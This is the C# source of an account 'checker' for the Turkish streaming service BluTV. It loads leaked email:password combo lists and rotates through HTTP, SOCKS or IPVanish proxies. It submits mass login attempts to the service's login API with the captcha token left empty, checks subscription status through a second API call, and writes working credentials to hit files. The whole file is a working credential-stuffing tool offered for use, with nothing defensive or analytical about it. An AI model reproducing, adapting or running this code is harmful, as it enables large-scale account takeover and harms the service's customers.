using Parsing;
using RuriLib.Http;
using RuriLib.Http.Models;
using RuriLib.Parallelization;
using RuriLib.Parallelization.Models;
using RuriLib.Proxies;
using RuriLib.Proxies.Clients;
using System.Data;
using System.Diagnostics;
using System.Net;
using System.Text;

namespace RecooChecker
{

    public partial class Form1 : Form
    {
        public enum Status
        {
            Good,
            Bad,
            Free,
            Premium,
            Ban,
            None
        }
        class Result
        {
            private string email;
            private string password;
            private Status status;

            public string Email { get => email; set => email = value; }
            public string Password { get => password; set => password = value; }
            public Status Status { get => status; set => status = value; }
        }



        public Form1()
        {
            InitializeComponent();
        }


        public static IEnumerable<string> wordlist = null;
        public object email { get; private set; }
        public object password { get; private set; }
        public object clientproxy { get; private set; }

        private static Parallelizer<string, Result> parallelizer = null;

        public int bad;
        public int check;
        public int good;
        public int free;
        public int error1;





        public async void HttpAyar()
        {

            if (!Directory.Exists(Environment.CurrentDirectory + @"\Result"))
            {
                Directory.CreateDirectory(Environment.CurrentDirectory + @"\Result");
            }


            void update() // Update Label //
            {
                check_label.Text = Convert.ToString(check);
                bad_label.Text = Convert.ToString(bad);
                hit_label.Text = Convert.ToString(good);
                free_label.Text = Convert.ToString(free);
                error_label.Text = Convert.ToString(error1);
                cpm_label.Text = parallelizer.CPM.ToString();
                progressbar.Maximum = Convert.ToInt32(total_label.Text) + 1;
                progressbar.Value++;
            }

            Func<string, CancellationToken, Task<Result>> parityCheck = new(async (number, token) => // Function //
            {
                var result = new Result();
                // Combo //

                var email = number.Split(":")[0];
                var password = number.Split(":")[1];

                // Proxy //
                var proxyy = File.ReadAllLines("proxy.txt");
                Random rnd = new Random();
                var prox = proxyy[rnd.Next(proxyy.Length)]; // Select Random Proxy //
                var ip = prox.Split(":")[0];
                var port = prox.Split(":")[1];

                //Http Settings //
                var selectedproxy = Convert.ToString(combobox.SelectedItem);

                var settings = new ProxySettings()
                {
                    ConnectTimeout = TimeSpan.FromSeconds(10),
                    ReadWriteTimeOut = TimeSpan.FromSeconds(30),
                    Host = $"{ip}",
                    Port = Convert.ToInt32(port),
                };
                if (selectedproxy == "Https")
                {
                    clientproxy = new HttpProxyClient(settings);
                }

                else if (selectedproxy == "Socks4")
                {
                    clientproxy = new Socks4ProxyClient(settings);
                }
                else if (selectedproxy == "Socks5")
                {
                    clientproxy = new Socks5ProxyClient(settings);
                }
                else if (selectedproxy == "Ipvanish")
                {
                    var user = prox.Split(":")[2];
                    var pass = prox.Split(":")[3];
                    var settings1 = new ProxySettings()
                    {
                        ConnectTimeout = TimeSpan.FromSeconds(10),
                        ReadWriteTimeOut = TimeSpan.FromSeconds(30),
                        Host = $"{ip}",
                        Port = Convert.ToInt32(port),
                        Credentials = new NetworkCredential($"{user}", $"{pass}") // User pass for ipvanish //
                    };
                    clientproxy = new Socks5ProxyClient(settings1);
                }
                else
                {
                    clientproxy = new NoProxyClient(settings);
                }

                using var client = new RLHttpClient((ProxyClient)clientproxy);

                // Create the request //
                using var request = new HttpRequest
                {
                    Uri = new Uri("https://www.blutv.com/api/login"),
                    Method = HttpMethod.Post,
                    Headers = new Dictionary<string, string> // Header //
                    {
                        {"Host", "www.blutv.com"},
                        {"Connection", "keep-alive"},
                        {"AppPlatform", "com.blu"},
                        {"Content-Type", "text/plain;charset=UTF-8"},
                        {"User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"},
                        {"AppCountry", "TUR"},
                        {"AppLanguage", "tr-TR"},
                        {"Accept", "*/*"},
                        {"Origin", "https//www.blutv.com"},
                        {"Sec-Fetch-Site", "same-origin"},
                        {"Sec-Fetch-Mode", "cors"},
                        {"Sec-Fetch-Dest", "empty"},
                        {"Referer", "https//www.blutv.com/giris"},
                        {"Accept-Language", "tr-TR,tr;q=0.9"},
                        {"Accept-Encoding", "gzip, deflate"},
                    },

                    // Post Data //
                    Content = new StringContent($"{{\"remember\":false,\"username\":\"{email}\",\"password\":\"{password}\",\"captchaVersion\":\"v3\",\"captchaToken\":\"\"}}", Encoding.UTF8, "text/plain")
                };

                update();

                // Send request //
                using var req = await client.SendAsync(request);

                // Read response //
                var response = await req.Content.ReadAsStringAsync();

                // Keycheck //
                if (response.Contains("accessToken"))
                {
                    var accessToken = LRParser.ParseBetween(response, "{\"accessToken\":\"", "\"").FirstOrDefault(); // Parse Token //
                    using var request1 = new HttpRequest
                    {
                        Uri = new Uri("https://www.blutv.com/api/me"),
                        Method = HttpMethod.Get,
                        Headers = new Dictionary<string, string>
                        {
                            {"Host", "www.blutv.com"},
                            {"Connection", "keep-alive"},
                            {"AppPlatform", "com.blu"},
                            {"User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"},
                            {"AppCountry", "TUR"},
                            {"AppLanguage", "tr-TR"},
                            {"Accept", "*/*"},
                            {"Origin", "https//www.blutv.com"},
                            {"Sec-Fetch-Site", "same-origin"},
                            {"Sec-Fetch-Mode", "cors"},
                            {"Sec-Fetch-Dest", "empty"},
                            {"Referer", "https//www.blutv.com/giris"},
                            {"Accept-Language", "tr-TR,tr;q=0.9"},
                            {"Accept-Encoding", "gzip, deflate"},
                        },
                        Cookies = new Dictionary<string, string>
                        {
                            {"token_a", accessToken}
                        },
                    };

                    // Send request 2 //
                    using var req1 = await client.SendAsync(request1);

                    // Read response 2 //
                    var response1 = await req1.Content.ReadAsStringAsync();

                    // Parse membership status //
                    var active = LRParser.ParseBetween(response1, "\"state\":\"", "\",\"providers\":").FirstOrDefault();

                    if (active.Contains("ACTIVE")) // Check membership status //
                    {
                        Interlocked.Increment(ref good);
                        Interlocked.Increment(ref check);
                        var bitis = LRParser.ParseBetween(response1, "\"end_date\":\"", "T").FirstOrDefault();
                        File.AppendAllText(@"Result\Hit.txt", email + ':' + password  + ':'+ bitis + '\n'); // Write to txt //
                    }
                    else
                    {
                        Interlocked.Increment(ref free);
                        Interlocked.Increment(ref check);
                        var currentdirectory = Directory.GetCurrentDirectory();
                        File.AppendAllText(@"Result\Free.txt", email + ':' + password + '\n');
                    }

                }
                else
                {
                    Interlocked.Increment(ref bad);
                    Interlocked.Increment(ref check);
                }
                return result;
            });


            wordlist = File.ReadLines("combo.txt");
            parallelizer = ParallelizerFactory<string, Result>.Create(
            type: ParallelizerType.TaskBased,
            workItems: wordlist,
            workFunction: parityCheck,
            degreeOfParallelism: bots.Value, // Thread number //
            totalAmount: wordlist.Count(), // Get wordlist count //
            skip: 0);

            parallelizer.NewResult += OnResult;
            parallelizer.Completed += OnCompleted;
            parallelizer.Error += OnException;
            parallelizer.TaskError += OnTaskError;

            await parallelizer.Start();

            try
            {

                var cts = new CancellationTokenSource();
                cts.CancelAfter(10000);
                await parallelizer.WaitCompletion(cts.Token);
            }
            catch (Exception ex)
            {

                Interlocked.Increment(ref error1);
            }


            static void OnResult(object sender, ResultDetails<string, Result> value)
            {
                //Console.WriteLine($"Got result {value.Result} from the parity check of {value.Item}");
            }

            



            void OnTaskError(object sender, ErrorDetails<string> details)
            {
                //Interlocked.Increment(ref error1);
            }
            void OnException(object sender, Exception ex)
            {
                Interlocked.Increment(ref error1);
            }


            static void OnCompleted(object sender, EventArgs e)
            {
                MessageBox.Show("Check Tamamlandý!");
            }
            update();
        }


        private void Start_Click(object sender, EventArgs e) // Start Button //
        {
            HttpAyar();
            total_label.Text = wordlist.Count().ToString();

        }


        private void Stop_Click(object sender, EventArgs e) // Stop Button //
        {
            parallelizer.Pause();
        }

        private void guna2ControlBox2_Click(object sender, EventArgs e)
        {

        }

        private void label2_Click(object sender, EventArgs e)
        {

        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void label2_Click_1(object sender, EventArgs e)
        {

        }

        private void guna2TrackBar1_Scroll(object sender, ScrollEventArgs e) // Bots bar //
        {
            bots.Minimum = 0;
            bots.Maximum = 200;
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void guna2CircleProgressBar1_ValueChanged(object sender, EventArgs e)
        {

        }

        private void label5_Click(object sender, EventArgs e)
        {

        }

        private void label7_Click(object sender, EventArgs e)
        {

        }

        private void label8_Click(object sender, EventArgs e)
        {

        }

        private void label12_Click(object sender, EventArgs e)
        {

        }

        private void total_label_Click(object sender, EventArgs e)
        {

        }

        private void hit_label_Click(object sender, EventArgs e)
        {

        }

        private void guna2ComboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void combobox_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void label7_Click_1(object sender, EventArgs e)
        {

        }

        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Process.Start(new ProcessStartInfo { FileName = @"https://discord.gg/Xd8VfYPHB3", UseShellExecute = true });
        }

        private void label6_Click(object sender, EventArgs e)
        {

        }

        private void guna2Button1_Click(object sender, EventArgs e)
        {
            Hitlist myForm = new Hitlist();
            //this.Hide();   
            myForm.Show();

        }

        private void label9_Click(object sender, EventArgs e)
        {

        }

        private void label6_Click_1(object sender, EventArgs e)
        {

        }

        private void cpm_label_Click(object sender, EventArgs e)
        {

        }
    }
}